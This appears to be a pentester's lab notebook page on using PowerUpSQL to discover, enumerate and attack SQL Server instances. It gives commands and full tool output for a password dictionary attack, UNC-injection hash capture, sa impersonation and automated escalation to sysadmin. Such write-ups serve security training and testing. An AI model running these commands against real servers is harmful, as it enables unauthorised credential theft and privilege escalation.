---
layout:
  width: wide
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
  tags:
    visible: true
---

# Using PowerUpSQL

## Recon

### **Discover SQL Server Instances**&#x20;

{% code overflow="wrap" %}
```powershell
# Both the command provides information about instances 
Get-SQLInstanceLocal
Get-SQLInstanceDomain 
## This command give SPN information which is further helpful for kerberoasting.
## Some instance may not be registered with AD. It is visible in Get-SQLInstanceLocal
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (298).png" alt=""><figcaption></figcaption></figure>

Connectivity testing is crucial because not all discovered instances may be accessible (e.g., due to firewalls, auth issues, or the service being down).

### Check accessibility of instances&#x20;

<figure><img src="../../../../.gitbook/assets/image (299).png" alt=""><figcaption></figcaption></figure>

## Enumeration

### Gather Basic Server Information&#x20;

{% code overflow="wrap" %}
```powershell
Get-SQLServerInfo -Instance <instance name>
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (300).png" alt=""><figcaption></figcaption></figure>

Retrieves core server metadata like version, patch level, OS, and auth mode. This is basic enumeration to fingerprint the target. More important term is `IsSysadmin` term. If it is yes then we can use it further for privilege escalation or further exploitation.&#x20;

### Gather Database information&#x20;

{% code overflow="wrap" %}
```powershell
Get-SQLDatabase -Instance <instance name> | Select-Object Instance,DatabaseName,DatabaseOwner
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (301).png" alt=""><figcaption></figcaption></figure>

### Enlist all direct sysadmins&#x20;

```
Get-SQLServerRoleMember | Select-Object RolePrincipalName,PrincipalName
```

<figure><img src="../../../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Check Password Policy&#x20;

```powershell
Invoke-SQLAuditWeakLoginPw
```

<figure><img src="../../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

### List server config settings essential for post-exploitation

{% code overflow="wrap" %}
```powershell
Get-SQLServerConfiguration | Where-Object {$_.Name -match "xp_cmdshell|Ole Automation|clr enabled|external scripts|Agent XPs|Database Mail|Ad Hoc Distributed Queries|remote access|remote admin|cross db ownership|contained database|filesystem|SMO and DMO|user instances"} | Select-Object Instance, Name, config_value
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (304).png" alt=""><figcaption></figcaption></figure>

In above result we need to manually check for various things. Instead of this use the below commands which instantly highlights actual risk.

{% code overflow="wrap" %}
```powershell
Get-SQLServerConfiguration -Instance "DBSRV01\ManagementSQL" | Where-Object {$_.config_value -eq 1 -and $_.Name -match "xp_cmdshell|Ole Automation|clr enabled|external scripts|Agent XPs|Database Mail|Ad Hoc Distributed Queries|remote access|remote admin|cross db ownership|contained database|filesystem|SMO and DMO|user instances"} | Select-Object Instance, Name, config_value
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>

The filesystem enumeration allows to use these procedures: `xp_dirtree`, `xp_subdirs`, and `xp_fileexist`.&#x20;

### List SQL Service accounts&#x20;

```powershell
Get-SQLServiceAccount -Instance <instance>
```

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This accounts can further be used for lateral movement.&#x20;

### Perform Vuln Audit (Without exploit)

```
Invoke-SQLAudit 
```

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can see that [#exploiting-unc-injection](using-powerupsql.md#exploiting-unc-injection "mention") is possible here because of `xp_dirtree` available to public role.&#x20;

## Credentialed Enumeration&#x20;

### List Server Logins&#x20;

{% code overflow="wrap" %}
```powershell
Get-SQLServerLogin | Select-Object Instance,PrincipalName

Get-SQLServerLogin -Instance <instance> -Username <username> -Password <password> | Select-Object Instance,Principalname
## Note that the username and password must be supplied of SQL authentication. Windows auth can't work in this fields.
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (302).png" alt=""><figcaption></figcaption></figure>

We can see the difference in result above because of the ownership. The terminal in black is executed as sqluser. That's why we can see other login that actually exists in the DBSRV01 instance. The ManagementSQL instance is owned by the `r0b` thus it gives correct listing in blue terminal. Thus we're able to get list of logins if one of the user actually has login to that instance available.&#x20;

<figure><img src="../../../../.gitbook/assets/image (303).png" alt=""><figcaption></figcaption></figure>

### Check if the current user is sysadmin

```powershell
Get-SQLSysadminCheck

Get-SQLSysadminCheck -Instance <instance> 

Get-SQLSysadminCheck -Instance <instance> -Username user -Password pass
```

<figure><img src="../../../../.gitbook/assets/image (308).png" alt=""><figcaption></figcaption></figure>

This is also visible in `Get-SQLServerInfo`.&#x20;

### List server-level privileges for login&#x20;

<figure><img src="../../../../.gitbook/assets/image (309).png" alt=""><figcaption></figcaption></figure>

**What to look for:**&#x20;

1. `Impersonate` -> privilege-escalation potential&#x20;
   1. _Chained impersonation is possible._&#x20;
2. `BUILTIN\Users CONNECT SQL` -> Broad login surface
   1. _If BUILTIN\Users can CONNECT, any local windows user (even low privileged) can reach SQL._&#x20;
3. `public VIEW ANY DATABASE` -> Information Disclosure
   1. _Any login can enumerate database names or metadata._&#x20;

### Identifying Misconfigured Impersonation (User Accounts)

```
Invoke-SQLAuditPrivImpersonateLogin
```

<figure><img src="../../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

The above thing is ran in `sqluser`.&#x20;

{% hint style="info" %}
_Note that impersonation details will be displayed only if the current user is login and user of the database._&#x20;
{% endhint %}

### Identifying Misconfigured Impersonation (DBO)

```
Invoke-SQLAuditPrivTrustWorthy
```

{% hint style="info" %}
_Impersonation on default database needs to be tested manually using commands mentioned in Pentesting MSSQL section. Also Trusthworhy on doesn't guarantee that DBO can be impersonated but even if DBO can be impersonated this option must be on._&#x20;
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Check for UNC Injection

```powershell
Invoke-SQLAuditPrivXpDirtree
```

<figure><img src="../../../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

### Check for linked Servers&#x20;

```sql
Get-SQLServerLinkCrawl

Get-SQLServerLink
```

<figure><img src="../../../../.gitbook/assets/image (338).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (339).png" alt=""><figcaption></figcaption></figure>

### Dump all server/db info to files&#x20;

```powershell
Invoke-SQLDumpInfo
## If nothing is mentioned then by default in current directory everything get exfiltrated. 
```

<figure><img src="../../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

## Exploitation&#x20;

### Exploiting UNC Injection

#### Identification&#x20;

* [#perform-vuln-audit-without-exploit](using-powerupsql.md#perform-vuln-audit-without-exploit "mention")
* [#check-for-unc-injection](using-powerupsql.md#check-for-unc-injection "mention")

#### Exploitation&#x20;

1. **Start SMB Server**&#x20;

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

2. **Send request to attacker machine**&#x20;

<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

3. **Boom. You got the hash**&#x20;

<figure><img src="../../../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Exploiting Misconfigured Impersonation (Impersonating SA)

#### Identification&#x20;

1. [#perform-vuln-audit-without-exploit](using-powerupsql.md#perform-vuln-audit-without-exploit "mention")
2. [#identifying-misconfigured-impersonation](using-powerupsql.md#identifying-misconfigured-impersonation "mention")

#### Exploitation&#x20;

<figure><img src="../../../../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>

## Post-Exploitation

### Dump Hashes of SQL Authentication&#x20;

{% hint style="info" %}
_It requires sysadmin permisison._&#x20;
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Automation&#x20;

### Privilege Escalation&#x20;

```
Invoke-SQLEscalatePriv
```

Attempts sysadmin priv esc via identified vulns.&#x20;

<figure><img src="../../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

**What all checks it performs**

{% code overflow="wrap" %}
```powershell
PS C:\Users\PowerUpSQL-master\PowerUpSQL-master> Invoke-SQLEscalatePriv -Verbose
VERBOSE: DBSRV01 : Checking if you're already a sysadmin...
VERBOSE: DBSRV01 : You're not a sysadmin, attempting to change that...
VERBOSE: LOADING VULNERABILITY CHECKS.
VERBOSE: RUNNING VULNERABILITY CHECKS.
VERBOSE: DBSRV01 : RUNNING VULNERABILITY CHECKS...
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: Default SQL Server Login Password
VERBOSE: DBSRV01 : No named instance found.
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: Default SQL Server Login Password
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: Weak Login Password
VERBOSE: DBSRV01 : CONNECTION SUCCESS.
VERBOSE: DBSRV01 - Getting supplied login...
VERBOSE: DBSRV01 : Enumerating principal names from 10000 principal IDs..
VERBOSE: DBSRV01 - Performing dictionary attack...
VERBOSE: DBSRV01 - Failed Login: User = sa Password = sa
VERBOSE: DBSRV01 - Failed Login: User = ##MS_SQLResourceSigningCertificate## Password = ##MS_SQLResourceSigningCertificate##
VERBOSE: DBSRV01 - Failed Login: User = ##MS_SQLReplicationSigningCertificate## Password = ##MS_SQLReplicationSigningCertificate##
VERBOSE: DBSRV01 - Failed Login: User = ##MS_SQLAuthenticatorCertificate## Password = ##MS_SQLAuthenticatorCertificate##
VERBOSE: DBSRV01 - Failed Login: User = ##MS_PolicySigningCertificate## Password = ##MS_PolicySigningCertificate##
VERBOSE: DBSRV01 - Failed Login: User = ##MS_SmoExtendedSigningCertificate## Password = ##MS_SmoExtendedSigningCertificate##
VERBOSE: DBSRV01 - Failed Login: User = ##MS_PolicyEventProcessingLogin## Password = ##MS_PolicyEventProcessingLogin##
VERBOSE: DBSRV01 - Failed Login: User = ##MS_PolicyTsqlExecutionLogin## Password = ##MS_PolicyTsqlExecutionLogin##
VERBOSE: DBSRV01 - Failed Login: User = ##MS_AgentSigningCertificate## Password = ##MS_AgentSigningCertificate##
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: Weak Login Password
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN
VERBOSE: DBSRV01 : CONNECTION SUCCESS.
VERBOSE: DBSRV01 : - Logins can be impersonated.
VERBOSE: DBSRV01 : - backontrack\sqladmin can impersonate the sa sysadmin login.
VERBOSE: DBSRV01 : - EXPLOITING: Starting exploit process...
VERBOSE: DBSRV01 : - EXPLOITING: Verified that the current user (backontrack\sqladmin) is NOT a sysadmin.
VERBOSE: DBSRV01 : - EXPLOITING: Attempting to add the current user (backontrack\sqladmin) to the sysadmin role by impersonating sa...
VERBOSE: DBSRV01 : - EXPLOITING: It was possible to make the current user (backontrack\sqladmin) a sysadmin!
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: Excessive Privilege - Server Link
VERBOSE: DBSRV01 : CONNECTION SUCCESS.
VERBOSE: DBSRV01 : - No exploitable SQL Server links were found.
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Server Link
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: Excessive Privilege - Trusted Database
VERBOSE: DBSRV01 : CONNECTION SUCCESS.
VERBOSE: DBSRV01 : - No non-default trusted databases were found.
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Trusted Database
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining
VERBOSE: DBSRV01 : CONNECTION SUCCESS.
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE
VERBOSE: DBSRV01 : CONNECTION SUCCESS
VERBOSE: DBSRV01 : Grabbing permissions for the master database...
VERBOSE: DBSRV01 : Grabbing permissions for the tempdb database...
VERBOSE: DBSRV01 : Grabbing permissions for the model database...
VERBOSE: DBSRV01 : Grabbing permissions for the msdb database...
VERBOSE: DBSRV01 : Grabbing permissions for the sqluserdb database...
VERBOSE: DBSRV01 : Grabbing permissions for the sqladmindb database...
VERBOSE: DBSRV01 : - The current login doesn't have the CREATE PROCEDURE permission in any databases.
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: Excessive Privilege - xp_dirtree
VERBOSE: DBSRV01 : CONNECTION SUCCESS.
VERBOSE: DBSRV01 : - At least one principal has EXECUTE privileges on xp_dirtree.
VERBOSE: DBSRV01 : - You do not have Administrator rights. Run this function as an Administrator in order to load Inveigh.
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: Excessive Privilege - XP_DIRTREE
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: Excessive Privilege - xp_fileexist
VERBOSE: DBSRV01 : CONNECTION SUCCESS.
VERBOSE: DBSRV01 : - The  principal has EXECUTE privileges on xp_fileexist.
VERBOSE: DBSRV01 : - You do not have Administrator rights. Run this function as an Administrator in order to load Inveigh.
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: Excessive Privilege - xp_fileexist
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: DATABASE ROLE - DB_DDLAMDIN
VERBOSE: DBSRV01 : CONNECTION SUCCESS
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_DDLADMIN
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER
VERBOSE: DBSRV01 : CONNECTION SUCCESS
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: SEARCH DATA BY COLUMN
VERBOSE: DBSRV01 : CONNECTION SUCCESS
VERBOSE: DBSRV01 : - Searching for column names that match criteria...
VERBOSE: DBSRV01 : - No columns were found that matched the search.
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: SEARCH DATA BY COLUMN
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: Potential SQL Injection - EXECUTE AS OWNER
VERBOSE: DBSRV01 : Connection Success.
VERBOSE: DBSRV01 : Checking databases below for vulnerable stored procedures:
VERBOSE: DBSRV01 : - Checking master database...
VERBOSE: DBSRV01 : - 0 found in master database
VERBOSE: DBSRV01 : - Checking tempdb database...
VERBOSE: DBSRV01 : - 0 found in tempdb database
VERBOSE: DBSRV01 : - Checking model database...
VERBOSE: DBSRV01 : - 0 found in model database
VERBOSE: DBSRV01 : - Checking msdb database...
VERBOSE: DBSRV01 : - 0 found in msdb database
VERBOSE: DBSRV01 : - Checking sqluserdb database...
VERBOSE: DBSRV01 : - 0 found in sqluserdb database
VERBOSE: DBSRV01 : - Checking sqladmindb database...
VERBOSE: DBSRV01 : - 0 found in sqladmindb database
VERBOSE: DBSRV01 : No automatic exploitation option has been provided. Uninformed exploitation of SQLi can have a negative impact on production environments.
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: Potential SQL Injection - EXECUTE AS OWNER
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: Potential SQL Injection - Signed by Certificate Login
VERBOSE: DBSRV01 : Connection Success.
VERBOSE: DBSRV01 : Checking databases below for vulnerable stored procedures:
VERBOSE: DBSRV01 : - Checking master database...
VERBOSE: DBSRV01 : - 0 found in master database
VERBOSE: DBSRV01 : - Checking tempdb database...
VERBOSE: DBSRV01 : - 0 found in tempdb database
VERBOSE: DBSRV01 : - Checking model database...
VERBOSE: DBSRV01 : - 0 found in model database
VERBOSE: DBSRV01 : - Checking msdb database...
VERBOSE: DBSRV01 : - 0 found in msdb database
VERBOSE: DBSRV01 : - Checking sqluserdb database...
VERBOSE: DBSRV01 : - 0 found in sqluserdb database
VERBOSE: DBSRV01 : - Checking sqladmindb database...
VERBOSE: DBSRV01 : - 0 found in sqladmindb database
VERBOSE: DBSRV01 : No automatic exploitation option has been provided. Uninformed exploitation of SQLi can have a negative impact on production environments.
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: Potential SQL Injection - Signed by Certificate Login
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: Excessive Privilege - Auto Execute Stored Procedure
VERBOSE: DBSRV01 : Connection Success.
VERBOSE: DBSRV01 : Checking for autoexec stored procedures...
VERBOSE: DBSRV01 : No stored procedures were found configured to auto execute.
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK.
VERBOSE: COMPLETED ALL VULNERABILITY CHECKS.
VERBOSE: DBSRV01 : Success! You are now a sysadmin!
PS C:\Users\PowerUpSQL-master\PowerUpSQL-master>

```
{% endcode %}

<details>

<summary><strong>Failed sysadmin for sqluser</strong></summary>

```
PS C:\Users\PowerUpSQL-master\PowerUpSQL-master> Invoke-SqlEscalatePriv -Verbose
VERBOSE: DBSRV01 : Checking if you're already a sysadmin...
VERBOSE: DBSRV01 : You're not a sysadmin, attempting to change that...
VERBOSE: LOADING VULNERABILITY CHECKS.
VERBOSE: RUNNING VULNERABILITY CHECKS.
VERBOSE: DBSRV01 : RUNNING VULNERABILITY CHECKS...
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: Default SQL Server Login Password
VERBOSE: DBSRV01 : No named instance found.
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: Default SQL Server Login Password
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: Weak Login Password
VERBOSE: DBSRV01 : CONNECTION SUCCESS.
VERBOSE: DBSRV01 - Getting supplied login...
VERBOSE: DBSRV01 : Enumerating principal names from 10000 principal IDs..
VERBOSE: DBSRV01 - Performing dictionary attack...
VERBOSE: DBSRV01 - Failed Login: User = sa Password = sa
VERBOSE: DBSRV01 - Failed Login: User = ##MS_SQLResourceSigningCertificate## Password = ##MS_SQLResourceSigningCertificate##
VERBOSE: DBSRV01 - Failed Login: User = ##MS_SQLReplicationSigningCertificate## Password = ##MS_SQLReplicationSigningCertificate##
VERBOSE: DBSRV01 - Failed Login: User = ##MS_SQLAuthenticatorCertificate## Password = ##MS_SQLAuthenticatorCertificate##
VERBOSE: DBSRV01 - Failed Login: User = ##MS_PolicySigningCertificate## Password = ##MS_PolicySigningCertificate##
VERBOSE: DBSRV01 - Failed Login: User = ##MS_SmoExtendedSigningCertificate## Password = ##MS_SmoExtendedSigningCertificate##
VERBOSE: DBSRV01 - Failed Login: User = ##MS_PolicyEventProcessingLogin## Password = ##MS_PolicyEventProcessingLogin##
VERBOSE: DBSRV01 - Failed Login: User = ##MS_PolicyTsqlExecutionLogin## Password = ##MS_PolicyTsqlExecutionLogin##
VERBOSE: DBSRV01 - Failed Login: User = ##MS_AgentSigningCertificate## Password = ##MS_AgentSigningCertificate##
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: Weak Login Password
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN
VERBOSE: DBSRV01 : CONNECTION SUCCESS.
VERBOSE: DBSRV01 : - Logins can be impersonated.
VERBOSE: DBSRV01 : - backontrack\sqladmin can impersonate the sa sysadmin login.
VERBOSE: DBSRV01 : - EXPLOITING: Starting exploit process...
VERBOSE: DBSRV01 : - EXPLOITING: Verified that the current user (backontrack\sqluser) is NOT a sysadmin.
VERBOSE: DBSRV01 : - EXPLOITING: Attempting to add the current user (backontrack\sqluser) to the sysadmin role by impersonating sa...
VERBOSE: DBSRV01 : - EXPLOITING: It was not possible to make the current user (backontrack\sqluser) a sysadmin.
VERBOSE: DBSRV01 : - backontrack\sqluser can impersonate the backontrack\sqladmin login (not a sysadmin).
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: Excessive Privilege - Server Link
VERBOSE: DBSRV01 : CONNECTION SUCCESS.
VERBOSE: DBSRV01 : - No exploitable SQL Server links were found.
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Server Link
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: Excessive Privilege - Trusted Database
VERBOSE: DBSRV01 : CONNECTION SUCCESS.
VERBOSE: DBSRV01 : - No non-default trusted databases were found.
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Trusted Database
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining
VERBOSE: DBSRV01 : CONNECTION SUCCESS.
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE
VERBOSE: DBSRV01 : CONNECTION SUCCESS
VERBOSE: DBSRV01 : Grabbing permissions for the master database...
VERBOSE: DBSRV01 : Grabbing permissions for the tempdb database...
VERBOSE: DBSRV01 : Grabbing permissions for the msdb database...
VERBOSE: DBSRV01 : - The current login doesn't have the CREATE PROCEDURE permission in any databases.
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: Excessive Privilege - xp_dirtree
VERBOSE: DBSRV01 : CONNECTION SUCCESS.
VERBOSE: DBSRV01 : - At least one principal has EXECUTE privileges on xp_dirtree.
VERBOSE: DBSRV01 : - You do not have Administrator rights. Run this function as an Administrator in order to load Inveigh.
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: Excessive Privilege - XP_DIRTREE
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: Excessive Privilege - xp_fileexist
VERBOSE: DBSRV01 : CONNECTION SUCCESS.
VERBOSE: DBSRV01 : - The  principal has EXECUTE privileges on xp_fileexist.
VERBOSE: DBSRV01 : - You do not have Administrator rights. Run this function as an Administrator in order to load Inveigh.
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: Excessive Privilege - xp_fileexist
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: DATABASE ROLE - DB_DDLAMDIN
VERBOSE: DBSRV01 : CONNECTION SUCCESS
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_DDLADMIN
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER
VERBOSE: DBSRV01 : CONNECTION SUCCESS
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: SEARCH DATA BY COLUMN
VERBOSE: DBSRV01 : CONNECTION SUCCESS
VERBOSE: DBSRV01 : - Searching for column names that match criteria...
VERBOSE: DBSRV01 : - No columns were found that matched the search.
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: SEARCH DATA BY COLUMN
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: Potential SQL Injection - EXECUTE AS OWNER
VERBOSE: DBSRV01 : Connection Success.
VERBOSE: DBSRV01 : Checking databases below for vulnerable stored procedures:
VERBOSE: DBSRV01 : - Checking master database...
VERBOSE: DBSRV01 : - 0 found in master database
VERBOSE: DBSRV01 : - Checking tempdb database...
VERBOSE: DBSRV01 : - 0 found in tempdb database
VERBOSE: DBSRV01 : - Checking msdb database...
VERBOSE: DBSRV01 : - 0 found in msdb database
VERBOSE: DBSRV01 : No automatic exploitation option has been provided. Uninformed exploitation of SQLi can have a negative impact on production environments.
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: Potential SQL Injection - EXECUTE AS OWNER
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: Potential SQL Injection - Signed by Certificate Login
VERBOSE: DBSRV01 : Connection Success.
VERBOSE: DBSRV01 : Checking databases below for vulnerable stored procedures:
VERBOSE: DBSRV01 : - Checking master database...
VERBOSE: DBSRV01 : - 0 found in master database
VERBOSE: DBSRV01 : - Checking tempdb database...
VERBOSE: DBSRV01 : - 0 found in tempdb database
VERBOSE: DBSRV01 : - Checking msdb database...
VERBOSE: DBSRV01 : - 0 found in msdb database
VERBOSE: DBSRV01 : No automatic exploitation option has been provided. Uninformed exploitation of SQLi can have a negative impact on production environments.
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK: Potential SQL Injection - Signed by Certificate Login
VERBOSE: DBSRV01 : START VULNERABILITY CHECK: Excessive Privilege - Auto Execute Stored Procedure
VERBOSE: DBSRV01 : Connection Success.
VERBOSE: DBSRV01 : Checking for autoexec stored procedures...
VERBOSE: DBSRV01 : No stored procedures were found configured to auto execute.
VERBOSE: DBSRV01 : COMPLETED VULNERABILITY CHECK.
VERBOSE: COMPLETED ALL VULNERABILITY CHECKS.
VERBOSE: DBSRV01 : Fail. We couldn't get you sysadmin access today.
PS C:\Users\PowerUpSQL-master\PowerUpSQL-master>

```

</details>

## Execute Commands&#x20;

Only sysadmins can execute commands because sysadmin has the power to modify the value of `xp_cmdshell`.&#x20;

### Using PowerUpSQL&#x20;

Actually in the backend same thing is hapenning when we use PowerUpSQL.&#x20;

<figure><img src="../../../../.gitbook/assets/image (310).png" alt=""><figcaption></figcaption></figure>

## ALL IS WELL&#x20;

| Level        | Stage                     | Command                                                 | Purpose/Description                                                                                                  | Example                                                                                                         |
| ------------ | ------------------------- | ------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
| Simple       | Initial Discovery / Recon | Get-SQLInstanceLocal                                    | Discovers SQL Server instances on the local machine via registry and services. Basic starting point for local recon. | Get-SQLInstanceLocal -Verbose                                                                                   |
| Simple       | Initial Discovery / Recon | Get-SQLInstanceDomain                                   | Discovers SQL Server instances on the domain via SPN queries (requires domain access).                               | Get-SQLInstanceDomain -Verbose                                                                                  |
| Simple       | Initial Discovery / Recon | Get-SQLConnectionTest                                   | Tests connectivity to a single SQL instance using Windows or SQL auth.                                               | Get-SQLConnectionTest -Instance "SQLSERVER\SQLEXPRESS" -Verbose                                                 |
| Simple       | Enumeration               | Get-SQLServerInfo                                       | Retrieves basic server info like version, edition, OS, and current login privs.                                      | Get-SQLServerInfo -Instance "SQLSERVER\SQLEXPRESS" -Verbose                                                     |
| Simple       | Enumeration               | Get-SQLDatabase                                         | Lists databases on the server (excludes defaults with -NoDefaults).                                                  | Get-SQLDatabase -Instance "SQLSERVER\SQLEXPRESS" -NoDefaults -Verbose                                           |
| Simple       | Credentialed Enumeration  | Get-SQLServerLogin                                      | Lists server logins with details like type, disabled status, and policy checks (requires creds for low-priv views).  | Get-SQLServerLogin -Instance "SQLSERVER\SQLEXPRESS" -Username sa -Password Pass123! -Verbose                    |
| Simple       | Credentialed Enumeration  | Get-SQLServerRole                                       | Lists server roles like sysadmin, serveradmin.                                                                       | Get-SQLServerRole -Instance "SQLSERVER\SQLEXPRESS" -Verbose                                                     |
| Simple       | Exploitation              | Invoke-SQLAuditWeakLoginPw                              | Audits for weak/blank passwords on SQL logins (non-exploitative check).                                              | Invoke-SQLAuditWeakLoginPw -Instance "SQLSERVER\SQLEXPRESS" -Verbose                                            |
| Simple       | Post-Exploitation         | Get-SQLServerConfiguration                              | Lists server config settings like xp\_cmdshell enabled.                                                              | Get-SQLServerConfiguration -Instance "SQLSERVER\SQLEXPRESS" -Verbose                                            |
| Simple       | Privilege Escalation      | Get-SQLSysadminCheck                                    | Checks if current login is sysadmin (basic priv check).                                                              | Get-SQLSysadminCheck -Instance "SQLSERVER\SQLEXPRESS" -Verbose                                                  |
| Intermediate | Initial Discovery / Recon | Get-SQLInstanceBroadcast                                | Discovers SQL instances via UDP broadcast (network recon).                                                           | Get-SQLInstanceBroadcast -Verbose                                                                               |
| Intermediate | Initial Discovery / Recon | Get-SQLInstanceFile                                     | Reads SQL instances from a file for batch processing.                                                                | Get-SQLInstanceFile -FilePath c:\temp\sqlinstances.txt -Verbose                                                 |
| Intermediate | Initial Discovery / Recon | Get-SQLConnectionTestThreaded                           | Threaded connectivity test for multiple instances (faster recon).                                                    | Get-SQLInstanceLocal                                                                                            |
| Intermediate | Enumeration               | Get-SQLTable                                            | Lists tables in databases (deeper schema enum).                                                                      | Get-SQLTable -Instance "SQLSERVER\SQLEXPRESS" -NoDefaults -Verbose                                              |
| Intermediate | Enumeration               | Get-SQLColumn                                           | Lists columns in tables (for data structure mapping).                                                                | Get-SQLColumn -Instance "SQLSERVER\SQLEXPRESS" -NoDefaults -Verbose                                             |
| Intermediate | Credentialed Enumeration  | Get-SQLServerPriv                                       | Lists server-level privileges for logins.                                                                            | Get-SQLServerPriv -Instance "SQLSERVER\SQLEXPRESS" -Username testuser -Password Pass123! -Verbose               |
| Intermediate | Credentialed Enumeration  | Get-SQLServerRoleMember                                 | Lists members of server roles.                                                                                       | Get-SQLServerRoleMember -Instance "SQLSERVER\SQLEXPRESS" -Verbose                                               |
| Intermediate | Exploitation              | Invoke-SQLAuditDefaultLoginPw                           | Checks for default SQL login passwords (common exploit vector).                                                      | Invoke-SQLAuditDefaultLoginPw -Instance "SQLSERVER\SQLEXPRESS" -Verbose                                         |
| Intermediate | Post-Exploitation         | Get-SQLStoredProcedure                                  | Lists stored procedures (for code review).                                                                           | Get-SQLStoredProcedure -Instance "SQLSERVER\SQLEXPRESS" -Verbose                                                |
